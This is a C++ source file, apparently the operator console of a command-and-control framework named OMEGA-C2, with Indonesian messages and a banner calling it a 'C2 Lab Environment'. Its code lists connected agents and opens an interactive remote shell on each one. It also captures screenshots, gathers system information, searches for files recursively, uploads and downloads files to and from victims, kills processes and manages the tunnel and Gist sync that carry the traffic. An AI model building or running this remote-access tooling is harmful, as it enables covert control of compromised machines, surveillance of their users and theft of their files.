#include "../include/ui_manager.h"
#include "../include/common_state.h"
#include "../include/ipc_manager.h"
#include "../include/tunnel_manager.h"
#include "../include/daemon_core.h"
#include "../include/session_manager.h"
#include <iostream>
#include <vector>
#include <sstream>
#include <fstream>
#include <ctime>
#include <iomanip>
#include <algorithm>
#include "../../common/utils.h"

#ifdef _WIN32
#include <windows.h>
#endif

void EnableVTMode() {
#ifdef _WIN32
    // Set console output and input code page to UTF-8
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE) return;
    
    DWORD dwMode = 0;
    if (GetConsoleMode(hOut, &dwMode)) {
        dwMode |= 0x0004; // ENABLE_VIRTUAL_TERMINAL_PROCESSING
        SetConsoleMode(hOut, dwMode);
    }
#endif
}

void AsyncLog(const std::string& msg) {
    std::lock_guard<std::mutex> lk(g_cout_mutex);
    // Clear the current line (which usually contains the prompt) visually
    std::cout << "\r\033[2K";
    // Print the message
    std::cout << msg << std::endl;
    // Reprint the prompt so the user isn't left hanging without a cursor context
    std::cout << "\n" << PROMPT_TAG;
    std::cout.flush();
}

// Simple JSON Pretty Printer
std::string PrettyPrintJson(const std::string& input) {
    if (input.empty()) return "";
    std::string out;
    int indent = 0;
    bool in_q = false;
    for (size_t i = 0; i < input.length(); i++) {
        char c = input[i];
        if (c == '\"' && (i == 0 || input[i-1] != '\\')) {
            in_q = !in_q;
            out += c;
        } else if (!in_q) {
            if (c == '{' || c == '[') {
                out += c;
                out += "\n";
                indent += 2;
                out += std::string(indent, ' ');
            } else if (c == '}' || c == ']') {
                if (!out.empty() && out.back() == ' ') {
                    while (!out.empty() && out.back() == ' ') out.pop_back();
                }
                out += "\n";
                if (indent >= 2) indent -= 2;
                out += std::string(indent, ' ');
                out += c;
            } else if (c == ',') {
                out += c;
                out += "\n";
                out += std::string(indent, ' ');
            } else if (c == ':') {
                out += ": ";
            } else if (c == '\n' || c == '\r') {
                // Skip existing newlines to avoid double spacing
            } else {
                out += c;
            }
        } else {
            out += c;
        }
    }
    return out;
}

// Helper for file saving (scans, results, etc)
std::string SaveAgentResult(int session_id, const std::string& type, const std::string& data, bool force_json) {
#ifdef _WIN32
    CreateDirectoryA(SCAN_DIR, NULL);
    CreateDirectoryA("screenshots", NULL);
#endif
    char timeBuf[80];
    time_t now = time(0);
    struct tm tstruct;
#ifdef _WIN32
    localtime_s(&tstruct, &now);
#else
    tstruct = *localtime(&now);
#endif
    strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%d_%H-%M-%S", &tstruct);
    std::string timestamp(timeBuf);

    if (type == "screenshot") {
        std::string binary = Base64Decode(data);
        std::string imgPath = "screenshots/session_" + std::to_string(session_id) + "_screen_" + timestamp + ".bmp";
        std::ofstream img(imgPath, std::ios::binary);
        if (img.is_open()) {
            img.write(binary.c_str(), binary.length());
            img.close();
            return imgPath;
        }
        return "ERR_SAVE_IMAGE";
    }

    std::string filename = std::string(SCAN_DIR) + "/session_" + std::to_string(session_id) + "_" + type + "_" + timestamp + ".json";
    
    // Detect if data is already JSON (starts with [ or {)
    bool isRawJson = (!data.empty() && (data[0] == '[' || data[0] == '{'));

    std::ofstream out(filename);
    if (out.is_open()) {
        out << "{\n";
        out << "  \"agent_id\": " << session_id << ",\n";
        out << "  \"timestamp\": \"" << timestamp << "\",\n";
        out << "  \"type\": \"" << type << "\",\n";
        
        if (isRawJson || force_json) {
            out << "  \"data\": " << PrettyPrintJson(data) << "\n";
        } else {
            out << "  \"data\": \"" << JsonEscape(data) << "\"\n";
        }
        out << "}\n";
        out.close();
        
        int lines = 0;
        std::stringstream ss(data);
        std::string dummy;
        while (std::getline(ss, dummy)) lines++;
        
        std::cout << SUCCESS_TAG << "Hasil " << CYAN << type << RESET << " di-arsip (" << YELLOW << lines << " item" << RESET << ") ke: " << YELLOW << filename << RESET << std::endl;
    } else {
        std::cout << ERROR_TAG << "Gagal menyimpan hasil ke " << filename << std::endl;
    }
    return filename;
}

void PrintBanner() {
    std::cout << PURPLE_HAZE << BOLD << "       ███╗   ███╗██╗██╗  ██╗██╗   ██╗ "<< ELECTRIC_CYAN << " ██████╗ ███████╗██╗   ██╗" << std::endl;
    std::cout << PURPLE_HAZE << BOLD << "       ████╗ ████║██║╚██╗██╔╝██║   ██║ "<< ELECTRIC_CYAN << " ██╔══██╗██╔════╝██║   ██║" << std::endl;
    std::cout << PURPLE_HAZE << BOLD << "       ██╔████╔██║██║ ╚███╔╝ ██║   ██║ "<< ELECTRIC_CYAN << " ██║  ██║█████╗  ██║   ██║" << std::endl;
    std::cout << PURPLE_HAZE << BOLD << "       ██║╚██╔╝██║██║ ██╔██╗ ██║   ██║ "<< ELECTRIC_CYAN << " ██║  ██║██╔══╝  ╚██╗ ██╔╝" << std::endl;
    std::cout << PURPLE_HAZE << BOLD << "       ██║ ╚═╝ ██║██║██╔╝ ██╗╚██████╔╝ "<< ELECTRIC_CYAN << " ██████╔╝███████╗ ╚████╔╝ " << std::endl;
    std::cout << PURPLE_HAZE << BOLD << "       ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝  "<< ELECTRIC_CYAN << " ╚═════╝ ╚══════╝  ╚═══╝  " << std::endl;
    std::cout << GRAY << "           The Professional Multi-Threaded C2 Lab Environment    " << RESET << std::endl;
    std::cout << SLATE << "                 Version 3.0 | Master Modular Refactor          " << RESET << std::endl << std::endl;
}

void PrintServerStatus() {
    std::string status = SendIPCRequest("STATUS");
    size_t p1 = status.find('|');
    size_t p2 = status.find('|', p1 + 1);
    if (p1 != std::string::npos && p2 != std::string::npos) {
        std::string url = status.substr(0, p1);
        std::string port = status.substr(p1 + 1, p2 - p1 - 1);
        std::string gist = status.substr(p2 + 1);
        std::cout << BLUE << " ┌─ " << BOLD << "STATUS SERVER" << RESET << std::endl;
        std::cout << BLUE << " ├─ " << RESET << "C2 URL   : " << CYAN << url << RESET << std::endl;
        std::cout << BLUE << " ├─ " << RESET << "Port     : " << WHITE << port << RESET << std::endl;
        std::cout << BLUE << " └─ " << RESET << "Gist Sync: " << (gist == "OK" ? GREEN + gist : RED + gist) << RESET << std::endl << std::endl;
    }
}

void CommandCenter() {
    std::string input;
    while (c2_running) {
        {
            std::lock_guard<std::mutex> lk(g_cout_mutex);
            std::cout << "\n" << PROMPT_TAG;
            std::cout.flush();
        }
        std::getline(std::cin, input);
        if (input.empty()) continue;

        if (input == "sessions") {
            std::string res = SendIPCRequest("LIST");
            if (res == "EMPTY") {
                std::cout << INFO_TAG << "Belum ada agen yang terhubung." << std::endl;
            } else if (res == "ERR_CONN") {
                std::cout << ERROR_TAG << "Gagal terhubung ke Core Daemon." << std::endl;
            } else {
                std::cout << "\n" << CYAN << BOLD << "  » " << WHITE << "DAFTAR SESI AKTIF" << RESET << std::endl;
                std::cout << std::string(45, '-') << std::endl;
                std::stringstream ss(res);
                std::string line;
                while (std::getline(ss, line)) {
                    if (line.empty()) continue;
                    std::stringstream sl(line);
                    std::string id, ip, status_str, last_seen_raw;
                    std::getline(sl, id, '|');
                    std::getline(sl, ip, '|');
                    std::getline(sl, status_str, '|');
                    std::getline(sl, last_seen_raw, '|');
                    time_t ts = std::stoll(last_seen_raw);
                    struct tm* tm_info = localtime(&ts);
                    char time_buffer[25];
                    strftime(time_buffer, 25, "%Y-%m-%d %H:%M:%S", tm_info);
                    std::string s_color = (status_str == "Active" ? GREEN : (status_str == "Sleeping" ? YELLOW : RED));
                    std::cout << "  " << CYAN << BOLD << "» " << RESET;
                    std::cout << "[" << YELLOW << id << RESET << "] " << WHITE << "agent-" << id << RESET;
                    std::cout << CYAN << " » " << s_color << status_str << RESET;
                    std::cout << CYAN << " » " << GRAY << "lastseen: " << WHITE << time_buffer << RESET << std::endl;
                }
            }
        } else if (input == "tunnel status") {
            std::string res = SendIPCRequest("T_STATUS");
            size_t pos = res.find('|');
            if (pos != std::string::npos) {
                std::string url = res.substr(0, pos);
                std::string status = res.substr(pos + 1);
                std::cout << INFO_TAG << "URL Tunnel: " << CYAN << url << RESET << std::endl;
                std::cout << INFO_TAG << "Status    : " << (status == "Running" ? GREEN + status : RED + status) << RESET << std::endl;
            }
        } else if (input == "tunnel restart") {
            std::cout << INFO_TAG << "Memulai ulang tunnel..." << std::endl;
            std::string res = SendIPCRequest("T_RESTART");
            std::cout << SUCCESS_TAG << "Tunnel di-restart: " << res << std::endl;
        } else if (input.substr(0, 5) == "kill ") {
            int target_id = std::stoi(input.substr(5));
            std::string res = SendIPCRequest("KILL " + std::to_string(target_id));
            std::cout << SUCCESS_TAG << " Sinyal dikirim: " << res << std::endl;
        } else if (input.substr(0, 9) == "interact ") {
            int target_id = std::stoi(input.substr(9));
            std::string res = SendIPCRequest("LIST");
            if (res.find(std::to_string(target_id) + "|") != std::string::npos) {
                InteractLoop(target_id);
            } else {
                std::cout << ERROR_TAG << "Sesi " << target_id << " tidak ditemukan atau sudah mati." << std::endl;
            }
        } else if (input == "exit" || input == "shutdown") {
            if (input == "exit") {
                if (is_master_process) { LaunchDaemon(); }
                c2_running = false;
                break;
            } else {
                CleanupSystem();
                c2_running = false;
                break;
            }
        } else if (input == "help") {
            std::cout << "\n" << CYAN << BOLD   << " ╔═══════════════════════════════════════════════════════════════════╗" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << WHITE << "OMEGA-C2 COMMAND OPERATIONS" << CYAN << "                                       ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ╠═══════════════════════════════════════════════════════════════════╣" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "sessions        " << RESET << " : Lihat semua agen yang aktif terhubung      " << CYAN << BOLD << "    ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "interact <id>   " << RESET << " : Masuk ke mode interaktif shell remote      " << CYAN << BOLD << "    ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "kill <id>       " << RESET << " : Hentikan agen target                       " << CYAN << BOLD << "    ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "tunnel status   " << RESET << " : Status konektivitas tunnel                 " << CYAN << BOLD << "    ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ║ " << YELLOW << "shutdown        " << RESET << " : Hentikan total seluruh layanan C2          " << CYAN << BOLD << "    ║" << RESET << std::endl;
            std::cout << CYAN << BOLD           << " ╚═══════════════════════════════════════════════════════════════════╝" << RESET << std::endl;
        } else if (input == "clear" || input == "cls") {
            #ifdef _WIN32
            ClearConsole();
            #else
            system("clear");
            #endif
            PrintBanner();
            PrintServerStatus();
        }
    }
}

void InteractLoop(int session_id) {
    std::string cmd;
    std::string agentCwd = "Agent";
    std::cout << SUCCESS_TAG << "Memasuki mode interaksi untuk Sesi " << session_id << std::endl;
    
    // FETCH INITIAL CWD
    std::string initResp = SendIPCRequest("EXEC " + std::to_string(session_id) + " cd .");
    if (initResp == "ERR_ID" || initResp == "ERR_CONN") {
        std::cout << ERROR_TAG << "Sesi " << session_id << " terputus atau tidak valid." << std::endl;
        return;
    }
    size_t initSep = initResp.find("|||");
    if (initSep != std::string::npos) {
        agentCwd = initResp.substr(initSep + 3);
    }

    auto SplitArgs = [](const std::string& input) {
        std::vector<std::string> parts;
        std::string cur;
        bool in_q = false;
        for (char c : input) {
            if (c == '"') in_q = !in_q;
            else if (c == ' ' && !in_q) { if (!cur.empty()) { parts.push_back(cur); cur.clear(); } }
            else cur += c;
        }
        if (!cur.empty()) parts.push_back(cur);
        return parts;
    };

    while (true) {
        {
            std::lock_guard<std::mutex> lk(g_cout_mutex);
            std::cout << "\n" << BOLD << MAGENTA << " OMEGA " << RESET << CYAN << "» " << WHITE << session_id << RESET << CYAN << " » " << CYAN << agentCwd << RESET << CYAN << " » " << RESET;
            std::cout.flush();
        }
        std::getline(std::cin, cmd);
        if (cmd.empty()) continue;
        if (cmd == "background" || cmd == "back") break;
        if (cmd == "help") {
            std::cout << "\n" << CYAN << BOLD << "  ╔═══════════════════════════════════════════════════════════════════╗" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << WHITE << "AGENT INTERACTION COMMANDS" << CYAN << "                                ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ╠═══════════════════════════════════════════════════════════════════╣" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "tasks           " << RESET << ": Daftar proses aktif                        " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "stop <pid/name> " << RESET << ": Menghentikan proses target                 " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "drives          " << RESET << ": Daftar drive & kapasitas                   " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":screenshot     " << RESET << ": Ambil tangkapan layar target               " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":sysinfo        " << RESET << ": Informasi hardware & OS detail             " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << ":search <pola>  " << RESET << ": Cari file rekursif (misal: *.txt)          " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "upload <L> <R>  " << RESET << ": Unggah file lokal ke agen                  " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "download <path> " << RESET << ": Unduh file dari komputer agen              " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ║ " << YELLOW << "background      " << RESET << ": Kembali ke menu utama                      " << CYAN << BOLD << " ║" << RESET << std::endl;
            std::cout << CYAN << BOLD << "  ╚═══════════════════════════════════════════════════════════════════╝" << RESET << std::endl;
            continue;
        }

        if (cmd.substr(0, 11) == ":screenshot") {
            std::string response = SendIPCRequest("EXEC " + std::to_string(session_id) + " screenshot");
            if (response.substr(0, 3) != "ERR") {
                std::string path = SaveAgentResult(session_id, "screenshot", response);
                std::cout << SUCCESS_TAG << "Screenshot disimpan ke: " << CYAN << path << RESET << std::endl;
            } else {
                std::cout << ERROR_TAG << "Gagal: " << response << std::endl;
            }
            continue;
        } else if (cmd.substr(0, 8) == ":sysinfo") {
            std::string response = SendIPCRequest("EXEC " + std::to_string(session_id) + " sysinfo");
            std::string path = SaveAgentResult(session_id, "sysinfo", response, true);
            std::cout << SUCCESS_TAG << "Sysinfo diproses: " << CYAN << path << RESET << std::endl;
            std::cout << GRAY << response << RESET << std::endl;
            continue;
        } else if (cmd.substr(0, 7) == ":search") {
            if (cmd.length() <= 8) continue;
            std::string pattern = cmd.substr(8);
            std::cout << INFO_TAG << "Mencari pola: " << YELLOW << pattern << RESET << "..." << std::endl;
            std::string res = SendIPCRequest("EXEC " + std::to_string(session_id) + " search " + pattern);
            if (res != "NO_FILES_FOUND") {
                SaveAgentResult(session_id, "search", res);
                std::cout << res << std::endl;
            } else { std::cout << ERROR_TAG << "Tidak ditemukan." << std::endl; }
            continue;
        }

        if (cmd.substr(0, 7) == "upload ") {
            std::vector<std::string> args = SplitArgs(cmd.substr(7));
            if (args.size() < 2) {
                std::cout << ERROR_TAG << "Gunakan: upload <local> <remote>" << std::endl;
                continue;
            }
            std::string localPath = args[0];
            std::string remotePath = args[1];
            std::string filename = localPath.substr(localPath.find_last_of("\\/") + 1);
            
            std::ifstream in(localPath, std::ios::binary);
            if (!in.is_open()) {
                std::cout << ERROR_TAG << "File lokal tidak ditemukan." << std::endl;
                continue;
            }
            std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            std::string b64 = Base64Encode(content);
            std::cout << INFO_TAG << "Mengunggah..." << std::endl;
            std::string response = SendIPCRequest("EXEC " + std::to_string(session_id) + " :upload " + remotePath + " " + b64 + "|" + filename);
            if (response.find("SUCCESS") != std::string::npos) std::cout << SUCCESS_TAG << "Upload berhasil." << std::endl;
            else std::cout << ERROR_TAG << "Gagal: " << response << std::endl;
            continue;
        }
        
        if (cmd.substr(0, 9) == "download ") {
            std::string path = cmd.substr(9);
            std::cout << INFO_TAG << "Mengunduh: " << YELLOW << path << RESET << "..." << std::endl;
            std::string response = SendIPCRequest("EXEC " + std::to_string(session_id) + " :download " + path);
            if (response.substr(0, 8) == "[BASE64]") {
                std::string data = Base64Decode(response.substr(8));
                std::string filename = path.substr(path.find_last_of("\\/") + 1);
                CreateDirectoryA("downloads", NULL);
                std::string localPath = "downloads/session_" + std::to_string(session_id) + "_" + filename;
                std::ofstream out(localPath, std::ios::binary);
                if (out.is_open()) {
                    out.write(data.data(), data.size());
                    out.close();
                    std::cout << SUCCESS_TAG << "Diunduh ke: " << GREEN << localPath << RESET << std::endl;
                }
            } else {
                std::cout << ERROR_TAG << "Gagal: " << response << std::endl;
            }
            continue;
        }

        if (cmd.substr(0, 5) == "stop ") {
            std::string target = cmd.substr(5);
            std::string response = SendIPCRequest("EXEC " + std::to_string(session_id) + " stop " + target);
            if (response.substr(0, 2) == "OK") std::cout << SUCCESS_TAG << "Proses dihentikan." << std::endl;
            else std::cout << ERROR_TAG << "Gagal: " << response << std::endl;
            continue;
        }

        std::string request = "EXEC " + std::to_string(session_id) + " " + cmd;
        std::string response = SendIPCRequest(request);
        if (response == "ERR_ID" || response == "ERR_CONN") {
            std::cout << "\n" << ERROR_TAG << RED << BOLD << "[!] Sesi terputus atau ID tidak valid. Kembali ke menu utama." << RESET << std::endl;
            break;
        }
        size_t sep = response.find("|||");
        std::string output = (sep != std::string::npos) ? response.substr(0, sep) : response;
        std::string cwd = (sep != std::string::npos) ? response.substr(sep + 3) : "";

        if (cmd == "tasks" || cmd == "drives") {
            SaveAgentResult(session_id, cmd, output);
        } else {
            if (output.find("ERR_EXEC") != std::string::npos) {
                std::cout << ERROR_TAG << RED << BOLD << "Perintah tidak dikenali atau gagal dijalankan. " << RESET << YELLOW << "Ketik 'help' untuk daftar perintah!" << RESET << std::endl;
            } else if (!output.empty()) {
                std::cout << output << std::endl;
            }
        }
        if (!cwd.empty() && cwd != "TERMINATED") agentCwd = cwd;
        if (cwd == "TERMINATED") break;
    }
}
